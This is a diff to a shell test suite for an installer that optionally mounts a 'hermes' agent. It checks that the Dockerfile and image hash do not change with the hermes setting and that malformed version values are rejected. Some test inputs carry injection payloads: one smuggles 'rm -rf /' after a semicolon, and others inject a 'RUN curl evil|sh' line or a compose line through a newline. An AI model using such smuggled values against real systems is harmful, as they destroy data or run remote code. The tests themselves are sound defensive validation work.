@@ -33,22 +33,31 @@ _render_dockerfile() {
 BASE="$TMPBASE/base"
 _render_dockerfile "$BASE" off ""
 [ -f "$BASE/Dockerfile" ] || _fail "baseline Dockerfile (hermes off) not written"
-! grep -q hermes "$BASE/Dockerfile" || _fail "hermes off but Dockerfile mentions hermes:
+! grep -q 'pip install' "$BASE/Dockerfile" || _fail "hermes off but Dockerfile installs packages:
 $(cat "$BASE/Dockerfile")"
-_ok "hermes off: Dockerfile has no hermes strings"
+[ "$(grep -c hermes "$BASE/Dockerfile")" = 1 ] || _fail "Dockerfile must mention hermes exactly once (the mountpoint line):
+$(cat "$BASE/Dockerfile")"
+_ok "hermes off: Dockerfile carries only the /opt/hermes mountpoint line"
 
 ON="$TMPBASE/on"
 _render_dockerfile "$ON" on "0.19.0"
-grep -q 'python3 -m venv /opt/hermes' "$ON/Dockerfile" || _fail "hermes on but venv RUN line missing"
-grep -q 'hermes-agent==0.19.0' "$ON/Dockerfile" || _fail "hermes on but pinned pip install missing"
-grep -q 'ln -s /opt/hermes/bin/hermes /usr/local/bin/hermes' "$ON/Dockerfile" || _fail "hermes on but symlink missing"
-_ok "hermes on: Dockerfile has pinned venv install block"
+grep -q 'ln -sf /opt/hermes/bin/hermes /usr/local/bin/hermes' "$ON/Dockerfile" || _fail "hermes mountpoint symlink missing"
+! grep -q 'pip install' "$ON/Dockerfile" || _fail "hermes must not be pip-installed into the image (it lives in the bins volume)"
+_ok "hermes on: Dockerfile only prepares the /opt/hermes mountpoint"
 
 DIFF_BASE="$TMPBASE/diffbase"
 _render_dockerfile "$DIFF_BASE" off ""
 diff -q "$BASE/Dockerfile" "$DIFF_BASE/Dockerfile" >/dev/null \
   || _fail "Dockerfile with hermes off is not byte-identical across renders"
 _ok "hermes off: Dockerfile is byte-identical to the baseline render"
+
+ON2="$TMPBASE/on2"
+_render_dockerfile "$ON2" on "latest"
+diff -q "$BASE/Dockerfile" "$ON/Dockerfile" >/dev/null \
+  || _fail "Dockerfile differs between hermes off and on - the image must be hermes-invariant"
+diff -q "$ON/Dockerfile" "$ON2/Dockerfile" >/dev/null \
+  || _fail "Dockerfile differs between hermes version targets - the image must be version-invariant"
+_ok "Dockerfile is invariant across hermes on/off and version target"
 
 BAD="$TMPBASE/bad"
 mkdir -p "$BAD"
@@ -58,14 +67,35 @@ if (
   export HOME="/home/x"
   export CBOX_WORKSPACES="/zerolab/agent_ecosystem"
   export CBOX_HERMES=on
+  export CBOX_HERMES_PROVIDER=local
+  export CBOX_HERMES_MODEL_URL="http://good.example/v1"
+  export CBOX_HERMES_MODEL_NAME=qwen
   export CBOX_HERMES_VERSION="not-a-version; rm -rf /"
   source "$INSTALL_DIR/_common.sh"
   source "$INSTALL_DIR/templates/generators.sh"
-  gen_dockerfile_into "$BAD" "sha256:deadbeef"
+  _cbox_hermes_validate_compose_env
 ) 2>/dev/null; then
-  _fail "gen_dockerfile_into accepted a malformed CBOX_HERMES_VERSION"
+  _fail "_cbox_hermes_validate_compose_env accepted a malformed CBOX_HERMES_VERSION"
 fi
-_ok "hermes on: bad version pin grammar dies loudly"
+_ok "hermes on: bad version target grammar dies loudly"
+
+if (
+  INSTALL_DIR="$INSTALL_DIR"
+  export INSTALL_DIR
+  export HOME="/home/x"
+  export CBOX_HERMES=on
+  export CBOX_HERMES_PROVIDER=local
+  export CBOX_HERMES_MODEL_URL="http://good.example/v1"
+  export CBOX_HERMES_MODEL_NAME=qwen
+  export CBOX_HERMES_VERSION=latest
+  source "$INSTALL_DIR/_common.sh"
+  source "$INSTALL_DIR/templates/generators.sh"
+  _cbox_hermes_validate_compose_env
+); then
+  _ok "hermes on: 'latest' is a valid channel target"
+else
+  _fail "_cbox_hermes_validate_compose_env rejected the latest channel target"
+fi
 
 M1="$TMPBASE/m1/managed.env"
 mkdir -p "$(dirname "$M1")"
@@ -143,14 +173,17 @@ if (
   export INSTALL_DIR
   export HOME="/home/x"
   export CBOX_HERMES=on
-  export CBOX_HERMES_VERSION="$(printf '0.19.0\nRUN curl evil|sh')"
+  export CBOX_HERMES_PROVIDER=local
+  export CBOX_HERMES_MODEL_URL="http://good.example/v1"
+  export CBOX_HERMES_MODEL_NAME=qwen
+  export CBOX_HERMES_VERSION="$(printf '0.19.0\n      - EVIL=1')"
   source "$INSTALL_DIR/_common.sh"
   source "$INSTALL_DIR/templates/generators.sh"
-  gen_dockerfile_into "$TMPBASE/m5" "sha256:deadbeef"
+  _cbox_hermes_validate_compose_env
 ) 2>/dev/null; then
-  _fail "gen_dockerfile_into accepted a newline-smuggled CBOX_HERMES_VERSION"
+  _fail "_cbox_hermes_validate_compose_env accepted a newline-smuggled CBOX_HERMES_VERSION"
 fi
-_ok "gen_dockerfile_into: newline-smuggled version pin rejected"
+_ok "compose env: newline-smuggled version target rejected"
 
 if (
   INSTALL_DIR="$INSTALL_DIR"
@@ -245,12 +278,15 @@ _image_inputs_hash() {
 
 H_OFF="$(_image_inputs_hash "$TMPBASE/inputs_off" off "")"
 H_ON="$(_image_inputs_hash "$TMPBASE/inputs_on" on "0.19.0")"
-[ "$H_OFF" != "$H_ON" ] || _fail "image.inputs hash unchanged when toggling CBOX_HERMES on"
-_ok "image.inputs: hash changes when hermes toggles on"
+[ "$H_OFF" = "$H_ON" ] || _fail "image.inputs hash changed when toggling CBOX_HERMES on - hermes must not be an image input"
+_ok "image.inputs: hash is invariant to the hermes toggle"
 
-H_ON2="$(_image_inputs_hash "$TMPBASE/inputs_on2" on "0.20.0")"
-[ "$H_ON" != "$H_ON2" ] || _fail "image.inputs hash unchanged when repinning CBOX_HERMES_VERSION"
-_ok "image.inputs: hash changes when hermes version is repinned"
+H_ON2="$(_image_inputs_hash "$TMPBASE/inputs_on2" on latest)"
+[ "$H_ON" = "$H_ON2" ] || _fail "image.inputs hash changed when moving the hermes version target - no rebuild may be needed for a repin"
+_ok "image.inputs: hash is invariant to the hermes version target"
+
+! grep -q hermes "$TMPBASE/inputs_on/image.inputs" || _fail "image.inputs still carries a hermes key"
+_ok "image.inputs: carries no hermes key at all"
 
 _validator_body() {
   local file="$1" fn="$2"
